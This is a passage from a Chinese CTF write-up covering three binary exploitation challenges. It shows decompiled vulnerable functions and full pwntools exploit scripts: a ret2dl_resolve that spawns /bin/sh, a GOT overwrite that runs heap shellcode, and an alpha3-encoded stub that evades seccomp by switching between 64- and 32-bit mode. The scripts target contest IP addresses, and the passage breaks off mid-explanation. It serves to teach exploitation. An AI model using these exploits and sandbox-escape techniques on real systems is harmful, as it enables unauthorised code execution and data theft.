__isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  result = v1;<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    signal(<span class="hljs-number">8</span>, (<span class="hljs-type">__sighandler_t</span>)vuln);            <span class="hljs-comment">// set handler</span><br>                                                <span class="hljs-comment">// SIGFPE 表示一个算数运算异常</span><br>    v2[<span class="hljs-number">1</span>] = v2[<span class="hljs-number">0</span>] / (<span class="hljs-type">int</span>)v1;                    <span class="hljs-comment">// 使运算异常调用漏洞函数</span><br>    result = signal(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">68</span>]; <span class="hljs-comment">// [esp+0h] [ebp-48h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>u);                  <span class="hljs-comment">// stack overflow</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p>漏洞函数中就是简单的堆栈溢出了，采用dl_runtime_resolve攻击。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> roputils <span class="hljs-keyword">import</span> ROP<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># roputils: https://github.com/inaz2/roputils/blob/master/roputils.py</span><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;./test&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>host = <span class="hljs-string">&quot;39.105.138.97:1234&quot;</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">0</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">if</span>(LOCAL):<br>        gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>    s(<span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span>)<br>    <span class="hljs-comment">#db()</span><br>    <span class="hljs-comment"># make calc error</span><br>    s(<span class="hljs-string">&#x27;\x00&#x27;</span> * <span class="hljs-number">0x20</span>)<br>    sl(<span class="hljs-built_in">str</span>(-<span class="hljs-number">0xcccccccc</span>))<br>    <span class="hljs-comment">#db()</span><br>    sl(<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br><br>    <span class="hljs-comment"># vuln, stack overflow</span><br>    rop  = ROP(elf_path)<br>    buf  = elf.bss()<br>    pop3 = <span class="hljs-number">0x08049581</span><br>    p = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x4C</span><br>    p += p32(elf.sym[<span class="hljs-string">&#x27;read&#x27;</span>])<br>    p += p32(pop3)<br>    p += p32(<span class="hljs-number">0</span>)<br>    p += p32(buf)<br>    p += p32(<span class="hljs-number">0x80</span>)<br>    p += rop.dl_resolve_call(buf + <span class="hljs-number">0x10</span>, buf, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># call, args</span><br>    sleep(<span class="hljs-number">0.5</span>)<br>    s(p)<br><br>    <span class="hljs-comment"># dl resolve data </span><br>    p = <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    p += rop.dl_resolve_data(buf + <span class="hljs-number">0x10</span>, <span class="hljs-string">&#x27;execve&#x27;</span>)<br>    p = p.ljust(<span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    sl(p)<br><br>    <span class="hljs-comment">#sleep(0.1)</span><br>    <span class="hljs-comment">#sl(p)</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>    ia()<br>    c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> LOCAL:<br>        elf = ELF(elf_path)<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>        io = elf.process()<br>    <span class="hljs-keyword">else</span>:<br>        elf = ELF(elf_path)<br>        io = remote(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]))<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>    exploit()<br>    finish()<br><br></code></pre></td></tr></table></figure>







<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>一个伪heap题，开启了沙箱，编辑和打印功能没有，只能开辟两次堆，释放一次，没办法进行堆操作。</p>
<p>存在个index 负数溢出，可以实现修改got表，为堆地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_E44</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> idx; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> size; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br><br>  <span class="hljs-keyword">if</span> ( add_nums &lt;= <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;index:&quot;</span>);<br>    idx = inputn();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;size:&quot;</span>);<br>    size = inputn();<br>    <span class="hljs-keyword">if</span> ( size &gt;= <span class="hljs-number">0</span> &amp;&amp; size &lt;= <span class="hljs-number">8</span> &amp;&amp; idx &lt;= <span class="hljs-number">1</span> )   <span class="hljs-comment">// index overflow</span><br>    &#123;<br>      bufs[idx] = <span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> ( !bufs[idx] )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      &#125;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;content:&quot;</span>);<br>      readn((_BYTE *)bufs[idx], size);<br>      ++add_nums;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> add_nums;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>查看程序架构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Arch:     amd64-64-little<br>RELRO:    Partial RELRO<br>Stack:    Canary found<br>NX:       NX disabled<br>PIE:      PIE enabled<br>RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>

<p>checksec发现存在rwx段，但发现是stack上的，想了半天没想通如何跳到堆栈那里去。</p>
<p>试试在堆上写shellcode，然后index溢出漏洞修改atoi的got地址为shellcode堆地址，跳到堆中执行指令，然而发现远程能执行，但自己本地不行，接下来就是orw的汇编指令编写了。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>elf_path  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>host = <span class="hljs-string">&quot;39.105.131.68:12354&quot;</span><br><span class="hljs-comment">#io = process(elf_path, env = &#123;&#x27;LD_PRELOAD&#x27;: libc_path&#125;)</span><br>io = remote(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]))<br>libc = ELF(libc_path)<br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">idx, sz, d</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br>    sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>():<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>    <span class="hljs-comment">#for i in range(2):</span><br>    <span class="hljs-comment"># wirte</span><br>    code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    lea r15, [rip + 0xf9] /* buf */</span><br><span class="hljs-string">    mov rdi, r15 /*buf*/</span><br><span class="hljs-string">    mov rsi, 0x0 </span><br><span class="hljs-string">    mov rdx, 0x0</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /*read*/</span><br><span class="hljs-string">    mov rdi, 3</span><br><span class="hljs-string">    mov rsi, r15</span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    /*write*/</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    p = asm(code, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    p = p.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    p += <span class="hljs-string">b&#x27;./flag\x00&#x27;</span><br><br>    ad(-<span class="hljs-number">14</span>, <span class="hljs-number">0</span>, p + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><span class="hljs-comment">#    db()</span><br>    <span class="hljs-comment"># call</span><br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>    ia()<br>    c()<br><br>exploit()<br>finish()<br><br></code></pre></td></tr></table></figure>





<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>沙箱检查如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0001: 0x15 0x06 0x00 0x00000005  if (A == fstat) goto 0008<br> 0002: 0x15 0x05 0x00 0x00000025  if (A == alarm) goto 0008<br> 0003: 0x15 0x03 0x00 0x00000004  if (A == stat) goto 0007<br> 0004: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0008<br> 0005: 0x15 0x02 0x00 0x00000009  if (A == mmap) goto 0008<br> 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008<br> 0007: 0x06 0x00 0x00 0x00000000  return KILL<br> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br></code></pre></td></tr></table></figure>

<p>输入的shellcode有检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v6; ++i )<br>&#123;<br>   <span class="hljs-keyword">if</span> ( v4[i] &lt;= <span class="hljs-number">31</span> || v4[i] == <span class="hljs-string">&#x27;\x7F&#x27;</span> )<br>     <span class="hljs-keyword">goto</span> LABEL_10;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>也就是机器码字符小于等于’\x31’的就退出或等于’\x7f’，我们可以采用alpha3工具将机器码生成可显示字符，当然这个工具有限制，机器码不能出现’\x00’，通过调试发现，shellcode的基址存放在rbx上，我们先实现一个输入的shellcode，避免后续不会再进行shellcode过滤。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">code = &#x27;&#x27;&#x27;<br>   mov r15, rbx<br>   xor rdx, rdx<br>   add dx, 0x1080<br>   mov rsi, r15<br>   add si, 0x120<br>   xor rax, rax<br>   syscall<br>   jmp rsi<br>   &#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>

<p>在原来的shellcode + 0x120处实现输入，再跳到那个地方去。</p>
<p>采用alpha3工具生成可显示shellcode如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M144x8k1L0I3z2m4p4N4p0Y1O3c8L2k4u4v2t0O1L0A400V044p3E0c<br></code></pre></td></tr></table></figure>

<p>当然我也写了个函数方便修改。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_code</span>():<br>    fd = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;sc.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>    code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov r15, rbx</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    add dx, 0x1080</span><br><span class="hljs-string">    mov rsi, r15</span><br><span class="hljs-string">    add si, 0x120</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    jmp rsi</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    p = asm(code, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>    fd.write(p)<br>    fd.close()<br>    cmd = <span class="hljs-string">&#x27;~/share/ctf/alpha3/ALPHA3.py x64 ascii mixedcase rbx --input=&quot;./sc.bin&quot;&#x27;</span><br>    p = os.popen(cmd).read()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;shellcode: &#x27;</span> + p)<br>    <span class="hljs-keyword">return</span> p<br></code></pre></td></tr></table></figure>



<p>然而这个题禁用函数太多了，open和write也禁了，只能切换到32位架构来实现部分绕过了，为了方便实现堆栈，指令储存，我重新申请了个地址段，方便后续实现架构切换方便与数据写入等。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">   /*mmap*/</span><br><span class="hljs-string">   mov r9d, 0          /* off */</span><br><span class="hljs-string">   mov r8d, 0xFFFFFFFF /* fd */ </span><br><span class="hljs-string">   mov r10d, 0x22 /* flags */</span><br><span class="hljs-string">   mov edx, 7          /* prot */</span><br><span class="hljs-string">   mov esi, 0x1000      /* len */</span><br><span class="hljs-string">   mov edi, 0x20000          /* addr */</span><br><span class="hljs-string">   mov eax, 9</span><br><span class="hljs-string">   syscall </span><br><span class="hljs-string"></span><br><span class="hljs-string">   /*read 32 shellcode*/</span><br><span class="hljs-string">   xor rax, rax</span><br><span class="hljs-string">   mov edi, 0</span><br><span class="hljs-string">   mov esi, 0x20000</span><br><span class="hljs-string">   mov edx, 0x1000 </span><br><span class="hljs-string">   syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">   /*retf to 32*/</span><br><span class="hljs-string">   mov rax, 0x2300020000</span><br><span class="hljs-string">   push rax</span><br><span class="hljs-string">   &#x27;&#x27;&#x27;</span><br>   p = asm(code, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>)<br>   p += <span class="hljs-string">b&#x27;\xCB&#x27;</span> <span class="hljs-comment"># retf</span><br></code></pre></td></tr></table></figure>

<p>上面是实现向我们开辟到的内存写入数据，再从64位架构切换到32为且跳到我们开辟的内存段中。</p>
<p>后面就是写32位的asm code了，然而我发现，在32位下，只有一个有用的函数能调用，就是open函数，其他的read，write这些都不能调用了，这又使得重新回到64位下实现读入flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">   mov esp, 0x20a00</span><br><span class="hljs-string"></span><br><span class="hljs-string">   /*open*/</span><br><span class="hljs-string">   mov eax, 5 </span><br><span class="hljs-string">   mov ebx, 0x20020</span><br><span class="hljs-string">   xor ecx, ecx</span><br><span class="hljs-string">   xor edx, edx</span><br><span class="hljs-string">   int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">   /*retf to 64*/</span><br><span class="hljs-string">   push 0x33</span><br><span class="hljs-string">   push 0x20030</span><br><span class="hljs-string">   &#x27;&#x27;&#x27;</span><br><br>   db()<br>   p = asm(code, arch = <span class="hljs-string">&#x27;i386&#x27;</span>)<br>   p += <span class="hljs-string">b&#x27;\xCB&#x27;</span> <span class="hljs-comment"># retf</span><br>   p = p.ljust(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>   p += <span class="hljs-string">b&#x27;./flag\x00&#x27;</span><br>   p = p.ljust(<span class="hljs-number">0x30</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)<br><br>   code = <span class="hljs-string">&#x27;&#x27;&#x27; </span><br><span class="hljs-string">   xor rax, rax</span><br><span class="hljs-string">   mov edi, 3</span><br><span class="hljs-string">   mov rsi, rsp</span><br><span class="hljs-string">   mov edx, 0x100</span><br><span class="hljs-string">   syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">   &#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>



<p>由于不能使用write的系统调用，只能采用延时爆破了</p>
